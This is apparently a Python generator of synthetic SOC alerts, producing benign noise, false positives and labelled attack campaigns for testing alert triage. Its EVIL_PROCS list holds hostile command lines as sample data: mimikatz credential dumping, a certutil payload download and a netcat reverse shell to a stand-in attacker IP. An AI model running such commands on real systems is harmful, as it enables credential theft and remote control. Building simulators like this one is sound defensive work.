"""Synthetic SOC alert generator (benign noise, false positives, multi-stage attack campaigns).

Used for the demo, unit tests, and the real-time simulator. Ground-truth `label`
(1 = part of a real attack, 0 = benign / false positive) is attached for evaluation.
"""
from __future__ import annotations

import heapq
import json
import math
import random
import time
from datetime import datetime, timedelta
from pathlib import Path

import pandas as pd

INTERNAL = [f"10.0.{i // 200}.{i % 200 + 10}" for i in range(80)]
SERVERS = [f"10.0.50.{i}" for i in range(10, 20)]
SCANNER = "10.0.9.9"  # authorised vulnerability scanner (benign but noisy)
EXTERNAL = [f"34.{i % 250}.{(i * 7) % 250}.{(i * 13) % 250 + 1}" for i in range(300)]
ATTACKERS = [f"185.{i + 10}.{(i * 17) % 250}.{(i * 29) % 250 + 1}" for i in range(30)]
KNOWN_BAD = ATTACKERS[:12]  # threat-intel feed knows only some attackers
HOSTNAME = {ip: (f"srv-{i:02d}" if ip in SERVERS else f"ws-{i:03d}")
            for i, ip in enumerate(INTERNAL + SERVERS)}
USER_OF = {ip: f"user{i:02d}" for i, ip in enumerate(INTERNAL)}
BENIGN_PROCS = ["chrome.exe", "outlook.exe", "python.exe", "powershell.exe", "cmd.exe", "teams.exe"]
EVIL_PROCS = ["mimikatz.exe sekurlsa::logonpasswords", "psexec.exe \\\\10.0.50.12 cmd",
              "powershell.exe -enc JABzAD0ATgBlAHcA", "certutil.exe -urlcache -f http://x/p.exe",
              "nc.exe -e cmd.exe 185.10.0.1 4444", "whoami /all"]
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 8080]

# (source, signature, category, severities, weights, ports, proto, service, kind, weight)
BENIGN = [
    ("suricata", "ET POLICY External IP Lookup", "policy", [1, 2], [8, 2], [80, 443], "tcp", "http", "ext", 22),
    ("suricata", "ET INFO DNS Query to Cloud Service", "info", [1], [1], [53], "udp", "dns", "ext", 24),
    ("suricata", "ET POLICY Dropbox Client Traffic", "policy", [1, 2], [7, 3], [443], "tcp", "ssl", "ext", 12),
    ("wazuh", "User login success", "auth_success", [1], [1], [22, 3389], "tcp", "ssh", "srv", 14),
    ("wazuh", "Failed password for user (typo)", "auth_failure", [2, 3], [7, 3], [22], "tcp", "ssh", "srv", 5),
    ("edr", "Script interpreter executed", "process", [2, 3], [6, 4], [0], "tcp", "none", "proc", 7),
    ("av", "Potentially unwanted application", "malware", [2, 3, 4], [4, 4, 2], [0], "tcp", "none", "proc", 3),
    ("suricata", "SURICATA TLS invalid certificate", "tls", [3, 4], [6, 4], [443], "tcp", "ssl", "ext", 5),
    ("suricata", "ET DROP Spamhaus listed IP (internet noise)", "reputation", [3, 4], [7, 3], [80, 443], "tcp", "http", "noise", 4),
    ("suricata", "ET POLICY Large file download", "policy", [2, 3], [5, 5], [443], "tcp", "ssl", "bigdl", 2),
    # attack-looking but benign (failed internet-wide probes, IT admin tooling): realistic false positives
    ("suricata", "ET EXPLOIT Apache Struts RCE attempt", "exploit", [3, 4], [6, 4], [80, 443, 8080], "tcp", "http", "noise", 3),
    ("suricata", "ET SCAN Potential port scan", "scan", [2, 3], [6, 4], COMMON_PORTS, "tcp", "none", "noise", 3),
    ("wazuh", "Failed password for invalid user", "auth_failure", [2, 3], [6, 4], [22], "tcp", "ssh", "noise", 4),
    ("edr", "Suspicious process execution", "process", [3, 4], [5, 5], [0], "tcp", "none", "adminproc", 2),
    ("suricata", "Lateral movement admin share access", "lateral", [3], [1], [445], "tcp", "smb", "srv", 1.5),
]


def _ev(ts, source, src, dst, port, proto, service, sig, cat, sev, label, process="", user="",
        nbytes=0, dur=0.0, ioc=0, attack_cat="", host=None):
    return {
        "timestamp": ts, "source": source, "src_ip": src, "dst_ip": dst, "dst_port": port,
        "proto": proto, "service": service, "host": host or HOSTNAME.get(dst) or HOSTNAME.get(src, "unknown"),
        "user": user or USER_OF.get(src, ""), "process": process, "signature": sig, "category": cat,
        "severity": int(max(1, min(5, sev))), "bytes": int(nbytes), "duration": float(dur),
        "ioc_match": int(ioc), "label": int(label), "attack_cat": attack_cat,
    }


def _background(rnd: random.Random, ts: datetime) -> dict:
    spec = rnd.choices(BENIGN, weights=[b[-1] for b in BENIGN])[0]
    source, sig, cat, sevs, sw, ports, proto, svc, kind, _ = spec
    sev = rnd.choices(sevs, weights=sw)[0]
    ws = rnd.choice(INTERNAL)
    port = rnd.choice(ports)
    nbytes = int(rnd.lognormvariate(8, 1.5))
    if kind == "ext":
        return _ev(ts, source, ws, rnd.choice(EXTERNAL), port, proto, svc, sig, cat, sev, 0, nbytes=nbytes)
    if kind == "srv":
        return _ev(ts, source, ws, rnd.choice(SERVERS), port, proto, svc, sig, cat, sev, 0, nbytes=nbytes)
    if kind == "noise":
        return _ev(ts, source, rnd.choice(EXTERNAL), rnd.choice(SERVERS), port, proto, svc, sig, cat, sev, 0, nbytes=nbytes)
    if kind == "bigdl":
        return _ev(ts, source, ws, rnd.choice(EXTERNAL), port, proto, svc, sig, cat, sev, 0,
                   nbytes=rnd.uniform(2e7, 1.5e8))
    if kind == "adminproc":
        return _ev(ts, source, ws, ws, port, proto, svc, sig, cat, sev, 0, user="it_admin",
                   process=rnd.choice(["psexec.exe \\\\10.0.50.12 hostname", "powershell.exe -enc QQBkAG0A", "whoami /all"]))
    return _ev(ts, source, ws, ws, port, proto, svc, sig, cat, sev, 0, process=rnd.choice(BENIGN_PROCS))


def _scanner_burst(rnd: random.Random, t0: datetime) -> list[dict]:
    out, t = [], t0
    for _ in range(rnd.randint(40, 90)):
        t += timedelta(seconds=rnd.uniform(0.1, 2))
        out.append(_ev(t, "suricata", SCANNER, rnd.choice(INTERNAL + SERVERS), rnd.choice(COMMON_PORTS), "tcp",
                       "none", "ET SCAN Authorised vulnerability scan", "scan", rnd.choice([1, 2, 2, 3]), 0))
    return out


def _campaign(rnd: random.Random, t0: datetime) -> list[dict]:
    """A multi-stage attack: recon -> brute force/exploit -> post-exploitation -> lateral -> exfil."""
    att = rnd.choice(ATTACKERS)
    known = att in KNOWN_BAD
    stealth = rnd.random() < 0.35
    victim = rnd.choice(INTERNAL)
    server = rnd.choice(SERVERS)
    ev, t = [], t0

    def sev(base):  # stealthy campaigns trigger low-severity alerts
        return base - (rnd.choice([1, 2]) if stealth else 0) + rnd.choice([-1, 0, 0, 1])

    def ioc():
        return 1 if (known and rnd.random() < 0.7) else 0

    def gap(a, b):
        return timedelta(seconds=rnd.uniform(a, b) * (6 if stealth else 1))

    if rnd.random() < 0.8:  # reconnaissance
        targets = rnd.sample(INTERNAL + SERVERS, k=rnd.randint(3, 12))
        for _ in range(rnd.randint(8, 20) if stealth else rnd.randint(25, 70)):
            t += gap(0.2, 5)
            ev.append(_ev(t, "suricata", att, rnd.choice(targets), rnd.choice(COMMON_PORTS + [rnd.randint(1, 65535)]),
                          "tcp", "none", "ET SCAN Potential port scan", "scan", sev(3), 1, ioc=ioc(), attack_cat="recon"))
        t += gap(20, 200)
    if rnd.random() < 0.5:  # brute force
        for _ in range(rnd.randint(12, 60)):
            t += gap(0.5, 6)
            ev.append(_ev(t, "wazuh", att, server, rnd.choice([22, 3389]), "tcp", "ssh",
                          "Failed password for invalid user", "auth_failure", sev(2), 1, ioc=ioc(), attack_cat="bruteforce"))
        t += gap(1, 5)
        ev.append(_ev(t, "wazuh", att, server, 22, "tcp", "ssh", "User login success", "auth_success", sev(2), 1,
                      user="admin", ioc=ioc(), attack_cat="bruteforce"))
    else:  # exploit
        for _ in range(rnd.randint(2, 7)):
            t += gap(1, 30)
            ev.append(_ev(t, "suricata", att, server, rnd.choice([80, 443, 8080]), "tcp", "http",
                          "ET EXPLOIT Apache Struts RCE attempt", "exploit", sev(4), 1, ioc=ioc(), attack_cat="exploit"))
    t += gap(20, 300)
    if rnd.random() < 0.7:  # post-exploitation + lateral movement
        for _ in range(rnd.randint(3, 10)):
            t += gap(2, 40)
            ev.append(_ev(t, "edr", victim, victim, 0, "tcp", "none", "Suspicious process execution", "process",
                          sev(4), 1, process=rnd.choice(EVIL_PROCS), attack_cat="postexploit"))
        for _ in range(rnd.randint(3, 12)):
            t += gap(2, 40)
            ev.append(_ev(t, "suricata", victim, rnd.choice(INTERNAL + SERVERS), rnd.choice([445, 3389, 5985]),
                          "tcp", "smb", "Lateral movement admin share access", "lateral", sev(4), 1, attack_cat="lateral"))
        t += gap(20, 200)
    if rnd.random() < 0.5:  # exfiltration
        for _ in range(rnd.randint(2, 6)):
            t += gap(5, 60)
            ev.append(_ev(t, "suricata", victim, att, rnd.choice([443, 8443, 53]), "tcp", "ssl",
                          "ET POLICY Large outbound transfer", "exfil", sev(3), 1, nbytes=rnd.uniform(5e7, 5e8),
                          ioc=ioc(), attack_cat="exfil"))
    return ev


def generate_dataset(n: int = 20000, seed: int = 42, days: int = 3,
                     start: datetime | None = None, mal_fraction: float = 0.12) -> pd.DataFrame:
    """Bulk labelled dataset of ~n alerts (benign noise + FP + attack campaigns)."""
    rnd = random.Random(seed)
    start = start or datetime(2026, 10, 1)
    span = days * 86400
    hour_w = [1] * 7 + [4] * 2 + [8] * 9 + [3] * 3 + [1] * 3  # busier in working hours
    events: list[dict] = []
    mal = 0
    while mal < mal_fraction * n:
        camp = _campaign(rnd, start + timedelta(seconds=rnd.uniform(0, span - 3600)))
        events += camp
        mal += len(camp)
    for k in range(days * 3):  # authorised scanner every ~8h
        events += _scanner_burst(rnd, start + timedelta(hours=8 * k + rnd.uniform(0, 1)))
    n_bg = max(0, n - len(events))
    for _ in range(n_bg):
        day = rnd.randrange(days)
        hour = rnd.choices(range(24), weights=hour_w)[0]
        ts = start + timedelta(days=day, hours=hour, seconds=rnd.uniform(0, 3599))
        events.append(_background(rnd, ts))
    df = pd.DataFrame(events).sort_values("timestamp", kind="stable").reset_index(drop=True)
    df.insert(0, "alert_id", [f"A{i:07d}" for i in range(len(df))])
    return df


def _poisson(rnd: random.Random, lam: float) -> int:
    lim, k, p = math.exp(-lam), 0, 1.0
    while True:
        p *= rnd.random()
        if p <= lim:
            return k
        k += 1


class LiveGenerator:
    """Emits alerts in real time; campaigns are queued and released when due."""

    def __init__(self, seed: int | None = None, campaign_every_s: float = 240, scanner_every_s: float = 600):
        self.rnd = random.Random(seed)
        self.pending: list[tuple[datetime, int, dict]] = []
        self.counter = 0
        self.p_campaign = 1.0 / campaign_every_s
        self.p_scanner = 1.0 / scanner_every_s

    def tick(self, now: datetime, rate: float = 1.0) -> list[dict]:
        if self.rnd.random() < self.p_campaign:
            for e in _campaign(self.rnd, now):
                self._push(e)
        if self.rnd.random() < self.p_scanner:
            for e in _scanner_burst(self.rnd, now):
                self._push(e)
        out = [_background(self.rnd, now) for _ in range(_poisson(self.rnd, rate))]
        while self.pending and self.pending[0][0] <= now:
            out.append(heapq.heappop(self.pending)[2])
        for e in out:
            self.counter += 1
            e["alert_id"] = f"L{int(time.time())}-{self.counter:06d}"
            e["timestamp"] = e["timestamp"].strftime("%Y-%m-%dT%H:%M:%S.%f")
        return out

    def _push(self, e: dict):
        self.counter += 1
        heapq.heappush(self.pending, (e["timestamp"], self.counter, e))


def simulate(out_path: str | Path, rate: float = 1.0, duration: float | None = None,
             seed: int | None = None, campaign_every: float = 240):
    """Append JSON-lines alerts to `out_path` once per second (simulates a live SIEM/IDS feed)."""
    out_path = Path(out_path)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    gen, t_end = LiveGenerator(seed, campaign_every_s=campaign_every), (time.time() + duration if duration else None)
    print(f"[simulator] writing ~{rate} alerts/s to {out_path}  (Ctrl+C to stop)")
    try:
        while t_end is None or time.time() < t_end:
            batch = gen.tick(datetime.utcnow(), rate=rate)
            with open(out_path, "a", encoding="utf-8") as fh:
                for e in batch:
                    fh.write(json.dumps(e) + "\n")
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[simulator] stopped")
